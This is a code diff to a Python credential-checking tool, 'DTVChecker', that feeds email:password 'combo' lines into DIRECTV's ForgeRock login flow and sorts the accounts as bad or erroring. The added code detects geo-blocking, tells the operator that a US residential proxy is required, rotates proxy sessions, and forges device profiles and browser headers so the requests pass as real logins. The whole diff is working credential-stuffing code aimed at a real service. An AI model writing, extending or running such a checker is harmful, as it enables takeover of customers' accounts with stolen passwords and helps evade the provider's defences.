@@ -229,6 +229,13 @@ class DTVChecker:
                 if login_error:
                     if login_error == "invalid_credentials":
                         return CheckResult(email, password, "BAD")
+                    if login_error == "geo_blocked":
+                        return CheckResult(
+                            email,
+                            password,
+                            "ERROR",
+                            error="Geo blocked — US residential proxy required",
+                        )
                     return CheckResult(email, password, "ERROR", error=login_error)
 
                 auth_code = self._get_auth_code(client, code_challenge, state)
@@ -306,6 +313,15 @@ class DTVChecker:
         except httpx.HTTPError as exc:
             return CheckResult(email, password, "ERROR", error=str(exc))
 
+    @staticmethod
+    def _auth_blocked(response: httpx.Response) -> bool:
+        location = (response.headers.get("location") or "").lower()
+        if response.status_code in {301, 302, 303, 307, 308}:
+            if "traveling" in location or "account-help" in location:
+                return True
+        body = response.text[:500].lower()
+        return "account-help-while-traveling" in body or "<!doctype html" in body
+
     def _forge_rock_login(
         self,
         client: httpx.Client,
@@ -314,8 +330,12 @@ class DTVChecker:
         password: str,
     ) -> str | None:
         response = client.post(f"{IDENTITY_BASE}/am/IdPwdAuth", headers=headers, content=b"")
+        if self._auth_blocked(response):
+            return "geo_blocked"
         data = self._json_or_error(response)
         if "authId" not in data:
+            if self._auth_blocked(response):
+                return "geo_blocked"
             return data.get("message") or "Auth init failed"
 
         payload = {
@@ -555,6 +575,55 @@ def parse_combo(line: str) -> tuple[str, str] | None:
     if not email or not password:
         return None
     return email, password
+
+
+def probe_geo_blocked(*, proxy: str | None = None, timeout: float = 20.0) -> bool:
+    """Return True when DIRECTV identity endpoints geo-block this IP."""
+    device_id = str(uuid.uuid4()).upper()
+    device_profile = json.dumps({"identifier": device_id, "metadata": {}})
+    code_verifier = secrets.token_urlsafe(43)
+    code_challenge = (
+        base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest())
+        .rstrip(b"=")
+        .decode()
+    )
+    state = json.dumps({"loginSessionId": secrets.token_hex(8)})
+    oauth_params = {
+        "response_type": "code",
+        "client_id": CLIENT_ID,
+        "fr_client_id": FR_CLIENT_ID,
+        "redirect_uri": REDIRECT_URI,
+        "code_challenge": code_challenge,
+        "code_challenge_method": "S256",
+        "deviceProfileInfo": device_profile,
+        "state": quote(state),
+        "logout": "false",
+    }
+    referer = f"{IDENTITY_BASE}/weblogin/authenticate?{urlencode(oauth_params)}"
+    headers = {
+        "User-Agent": USER_AGENT,
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-API-Version": "resource=2.0, protocol=1.0",
+        "client_id": FR_CLIENT_ID,
+        "X-DTV-Device-Profile": device_profile,
+        "Content-Type": "application/json",
+        "Origin": IDENTITY_BASE,
+        "Referer": referer,
+    }
+    proxy_url = proxy
+    if proxy_url:
+        proxy_url = with_rotating_session(proxy_url)
+    try:
+        with httpx.Client(follow_redirects=False, timeout=timeout, proxy=proxy_url) as client:
+            client.get(referer, headers={"User-Agent": USER_AGENT})
+            response = client.post(f"{IDENTITY_BASE}/am/IdPwdAuth", headers=headers, content=b"")
+            if DTVChecker._auth_blocked(response):
+                return True
+            data = DTVChecker._json_or_error(response)
+            return "authId" not in data and DTVChecker._auth_blocked(response)
+    except httpx.HTTPError:
+        return False
 
 
 def check_account(
